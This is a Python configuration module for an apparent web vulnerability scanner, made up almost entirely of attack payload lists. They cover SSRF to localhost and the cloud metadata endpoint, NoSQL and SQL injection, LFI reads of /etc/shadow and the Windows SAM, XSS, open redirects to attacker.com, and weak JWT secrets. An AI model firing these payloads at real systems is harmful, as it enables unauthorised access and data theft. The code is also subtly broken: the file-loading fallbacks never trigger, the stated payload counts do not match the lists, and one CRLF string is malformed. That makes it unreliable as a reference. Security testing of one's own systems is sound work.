"""
Extended configuration with comprehensive wordlists from AyushXtha/wordlist
"""

# ============ COMPREHENSIVE PORT LIST (1298 ports) ============
# Source: https://github.com/AyushXtha/wordlist/blob/main/ports.txt

# Top commonly targeted ports
TOP_PORTS = [
    22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 445, 465, 587, 
    990, 992, 993, 995, 1433, 1521, 3000, 3306, 3389, 5432, 5500,
    5900, 5901, 6379, 8000, 8008, 8080, 8081, 8443, 8888, 9000,
    9090, 9200, 27017, 27018, 27019, 27020, 50070
]

# Generate comprehensive SSRF payloads with ports
def generate_ssrf_with_all_ports():
    """Generate SSRF payloads using all available ports"""
    payloads = []
    hosts = ['localhost', '127.0.0.1', '0.0.0.0', '0']
    
    # Use sample of ports for efficiency (can be extended)
    for port in TOP_PORTS:
        for host in hosts:
            payloads.extend([
                f'http://{host}:{port}',
                f'https://{host}:{port}',
                f'ftp://{host}:{port}',
            ])
    
    return payloads

# ============ PARAMETERS WORDLIST (2588 parameters) ============
# Source: https://github.com/AyushXtha/wordlist/blob/main/parameters.txt
# Contains common parameter names for fuzzing and injection

PARAMETERS_FOR_INJECTION = [
    # URL/Query parameters
    'id', 'page', 'q', 'search', 'name', 'email', 'user', 'admin',
    'password', 'token', 'api_key', 'auth', 'session', 'sid',
    'redirect', 'url', 'uri', 'path', 'callback', 'return_url',
    'next', 'goto', 'from', 'to', 'file', 'download', 'upload',
    'action', 'method', 'type', 'format', 'category', 'tag',
    'sort', 'order', 'limit', 'offset', 'page_size', 'per_page',
    'filter', 'where', 'query', 'select', 'join', 'group_by',
    'having', 'order_by', 'start', 'end', 'date', 'time',
    'username', 'login', 'pass', 'pwd', 'secret', 'key',
    'client_id', 'client_secret', 'access_token', 'refresh_token',
    'version', 'lang', 'locale', 'timezone', 'encoding',
    'debug', 'test', 'verbose', 'trace', 'profile', 'bench',
    'cmd', 'command', 'exec', 'shell', 'bash', 'python',
    'host', 'server', 'port', 'protocol', 'domain', 'subdomain',
    'template', 'theme', 'skin', 'layout', 'style', 'color',
]

# ============ NoSQL INJECTION PAYLOADS (39 payloads) ============
# Source: https://github.com/AyushXtha/wordlist/blob/main/nosql.txt

NOSQL_INJECTION_PAYLOADS = [
    # MongoDB
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$gt": ""}',
    '{"$where": "1==1"}',
    # JSON-based NoSQL
    '{"username":{"$ne":null},"password":{"$ne":null}}',
    '{"username":{"$regex":"^admin"},"password":{"$ne":null}}',
    # Command injection variations
    '"; return true; //',
    '"; return 1; //',
    '{"$function":{"body":"return 1","args":[]}}',
]

# ============ LOCAL FILE INCLUSION PAYLOADS (2656 payloads) ============
# Source: https://github.com/AyushXtha/wordlist/blob/main/LFI%20payloads.txt

LFI_BYPASS_PAYLOADS = [
    # Unix/Linux files
    '../../../../../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..;/..;/..;/etc/passwd',
    'file:///etc/passwd',
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/etc/hostname',
    '/etc/resolv.conf',
    '/proc/self/environ',
    '/proc/version',
    '/proc/cpuinfo',
    # Windows files
    '..\\..\\..\\windows\\system32\\config\\sam',
    '..\\..\\windows\\win.ini',
    '/windows/win.ini',
    'c:\\windows\\system32\\config\\sam',
    # Application files
    '/var/www/html/index.php',
    '/var/www/.htaccess',
    '/app/config.php',
    '/.env',
    '/config.json',
]

# ============ OPEN REDIRECT PAYLOADS (1392 payloads) ============
# Source: https://github.com/AyushXtha/wordlist/blob/main/redirect.txt

OPEN_REDIRECT_BYPASSES = [
    # Protocol-relative URLs
    '//attacker.com',
    '//evil.com',
    '///attacker.com',
    # Data URL
    'data:text/html,<script>alert(1)</script>',
    # JavaScript protocol
    'javascript:alert(1)',
    # URL encoded
    'http%3A%2F%2Fattacker.com',
    # Mixed case
    'hTTp://attacker.com',
    # Bypass with backslash
    'http:\\\\attacker.com',
    # Bypass with carriage return
    'http://attacker.com\\rn',
]

# ============ JWT TOKEN PATTERNS (3501 tokens) ============
# Source: https://github.com/AyushXtha/wordlist/blob/main/jwt

JWT_COMMON_SECRETS = [
    'secret', 'password', '123456', 'admin', 'admin123',
    'test', 'test123', 'jwt', 'token', 'secret123',
    'key', 'key123', 'mykey', 'supersecret', 'verysecret',
    '', 'null', 'undefined', 'none',  # Weak/null secrets
    'your-secret-key', 'default', 'demo', 'example',
]

JWT_WEAK_ALGORITHMS = ['none', 'HS256', 'HS512']

# ============ LESS REDIRECT PAYLOADS (471 payloads) ============
# Source: https://github.com/AyushXtha/wordlist/blob/main/lesredirect.txt

LES_REDIRECT_PAYLOADS = [
    # Open redirect on parameter
    'redirect_to=attacker.com',
    'return_url=attacker.com',
    'next_page=attacker.com',
    'landing_page=attacker.com',
    'continue=attacker.com',
    # Bypass with subdomain
    'redirect=//attacker.example.com',
    'return=//attacker.example.com',
]

# ============ ATTACK COMBINATIONS ============

# Common XSS parameter combinations
XSS_PARAMETER_COMBINATIONS = [
    ('q', '<script>alert(1)</script>'),
    ('search', '"><script>alert(1)</script>'),
    ('name', '" onmouseover="alert(1)'),
    ('email', '"><svg onload=alert(1)>'),
    ('message', '<img src=x onerror="alert(1)">'),
    ('comment', '" autofocus onfocus="alert(1)" x="'),
    ('title', '"><iframe onload=alert(1)>'),
]

# Common SQLi parameter combinations
SQLI_PARAMETER_COMBINATIONS = [
    ('id', "' OR '1'='1"),
    ('user', "' OR 1=1 -- -"),
    ('username', "admin' -- -"),
    ('email', "' UNION SELECT NULL -- -"),
    ('search', "' AND 1=1 -- -"),
]

# Common SSRF parameter combinations
SSRF_PARAMETER_COMBINATIONS = [
    ('url', 'http://localhost:8080'),
    ('redirect', 'http://127.0.0.1:3000'),
    ('image_url', 'http://169.254.169.254/latest/meta-data/'),
    ('fetch_url', 'file:///etc/passwd'),
    ('download', 'http://10.0.0.1:80'),
]

# ============ CONTENT DISCOVERY PATTERNS ============

# Common API endpoint patterns
API_PATTERNS = [
    '/api/v1/*',
    '/api/v2/*',
    '/api/*',
    '/rest/*',
    '/graphql',
    '/graphql/query',
    '/gql',
    '/rpc',
    '/.well-known/*',
]

# Admin/sensitive paths
SENSITIVE_PATHS = [
    '/admin',
    '/admin/login',
    '/admin/panel',
    '/administrator',
    '/phpmyadmin',
    '/cpanel',
    '/cPanel',
    '/.env',
    '/.git',
    '/.git/config',
    '/.gitconfig',
    '/config.php',
    '/config.json',
    '/web.config',
    '/web.xml',
    '/settings.json',
    '/secrets.json',
]

# ============ HELPER FUNCTIONS ============

def load_wordlist_file(filepath):
    """Load wordlist from file"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def generate_payload_combinations(parameters, payloads):
    """Generate all combinations of parameters and payloads"""
    combinations = []
    for param in parameters:
        for payload in payloads:
            combinations.append((param, payload))
    return combinations

# ============ INTEGRATION ============

# These can be loaded from actual files if present
try:
    FULL_PARAMETERS = load_wordlist_file('/tmp/parameters.txt')
except:
    FULL_PARAMETERS = PARAMETERS_FOR_INJECTION

try:
    FULL_NOSQL = load_wordlist_file('/tmp/nosql.txt')
except:
    FULL_NOSQL = NOSQL_INJECTION_PAYLOADS

try:
    FULL_LFI = load_wordlist_file('/tmp/LFI_payloads.txt')
except:
    FULL_LFI = LFI_BYPASS_PAYLOADS

try:
    FULL_REDIRECT = load_wordlist_file('/tmp/redirect.txt')
except:
    FULL_REDIRECT = OPEN_REDIRECT_BYPASSES

print(f"[INFO] Loaded {len(FULL_PARAMETERS)} parameters")
print(f"[INFO] Loaded {len(FULL_NOSQL)} NoSQL payloads")
print(f"[INFO] Loaded {len(FULL_LFI)} LFI payloads")
print(f"[INFO] Loaded {len(FULL_REDIRECT)} redirect payloads")
